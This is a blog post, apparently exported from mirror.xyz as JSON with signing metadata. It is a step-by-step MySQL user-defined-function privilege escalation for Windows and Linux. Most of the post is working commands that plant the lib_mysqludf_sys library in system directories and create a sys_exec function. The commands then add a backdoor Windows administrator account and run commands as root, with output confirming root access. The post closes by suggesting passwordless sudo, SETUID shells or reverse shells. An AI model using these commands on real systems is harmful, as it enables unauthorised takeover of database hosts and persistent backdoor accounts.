"{\"content\":{\"body\":\"We will get into making our own functions in later posts but for now, the UDF compiled shared objects from SQLMap are great.\\n\\n<https://github.com/int0x33/sqlmap/tree/master/udf/mysql>\\n\\n### Windows Escalation\\n\\n```\\nmysql> USE mysql;\\nmysql> CREATE TABLE pwn(line blob);\\nmysql> INSERT INTO pwn values(load_file('C://xampplite//htdocs//mail//lib_mysqludf_sys.dll'));\\nmysql> SELECT * FROM mysql.pwn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';\\nmysql> CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';\\nmysql> SELECT sys_exec(\\\"net user pwned pwn123! /add\\\");\\nmysql> SELECT sys_exec(\\\"net localgroup Administrators pwned /add\\\");\\n```\\n\\n### Linux Escalation\\n\\n```\\nmysql> use mysql;\\nmysql> create table pwn(line blob);\\nmysql> insert into pwn values(load_file('/home/npn/lib_mysqludf_sys.so'));\\nmysql> select * from pwn into dumpfile '/usr/lib/lib_mysqludf_sys.so';\\nmysql> create function sys_exec returns integer soname 'lib_mysqludf_sys.so';\\nmysql> select sys_exec('id > /tmp/out; chown npn.npn /tmp/out');\\n```\\n\\n### Verify Command Execution\\n\\n```\\nuser@box:/$ cat /tmp/out uid=0(root) gid=0(root) groups=0(root)\\n```\\n\\nYou can now execute code as root, what more do you need? You can allow SUDO all no password or create SETUID shell program with c, execute a reverse shell, etc, whatever you want. Be creative.\",\"timestamp\":1637144363,\"title\":\"MySql User-Defined Function (UDF) Privilege Escalation (Windows & Linux)\"},\"digest\":\"tNu9Wdpz8BBY9BMkz7pdY48YAuENzetBT97GaXYRsZg\",\"authorship\":{\"contributor\":\"0x512e8a35C72F08caD58c50352f567971df8294f7\",\"signingKey\":\"{\\\"crv\\\":\\\"P-256\\\",\\\"ext\\\":true,\\\"key_ops\\\":[\\\"verify\\\"],\\\"kty\\\":\\\"EC\\\",\\\"x\\\":\\\"IMWH8uq0YGSEy8rAxIT2h6A_fSjRRs912r-TUkl0X-k\\\",\\\"y\\\":\\\"XaY5LIwJnyf34nzwOGtLr6OHiybggaU2xpPwQrY6dXY\\\"}\",\"signature\":\"mDR6V-_K9dZIjM7YeZZt7Ic_fSZAT2nbjE0eIRXFrPpVhArGEpCFoKmZJHFb7Kj04n6GDBqo1DJAgMTiYfewJg\",\"signingKeySignature\":\"0x07c38f1299c6ae7718fea651cb5ffbbe013b64beefe9609de4cee98177604e340d2fab21b095942c95da0b6a070058063909fdb7eecdc67dad7ddc5ecc9fae841c\",\"signingKeyMessage\":\"I authorize publishing on mirror.xyz from this device using:\\n{\\\"crv\\\":\\\"P-256\\\",\\\"ext\\\":true,\\\"key_ops\\\":[\\\"verify\\\"],\\\"kty\\\":\\\"EC\\\",\\\"x\\\":\\\"IMWH8uq0YGSEy8rAxIT2h6A_fSjRRs912r-TUkl0X-k\\\",\\\"y\\\":\\\"XaY5LIwJnyf34nzwOGtLr6OHiybggaU2xpPwQrY6dXY\\\"}\",\"algorithm\":{\"name\":\"ECDSA\",\"hash\":\"SHA-256\"}},\"nft\":{},\"version\":\"12-21-2020\",\"originalDigest\":\"tNu9Wdpz8BBY9BMkz7pdY48YAuENzetBT97GaXYRsZg\"}"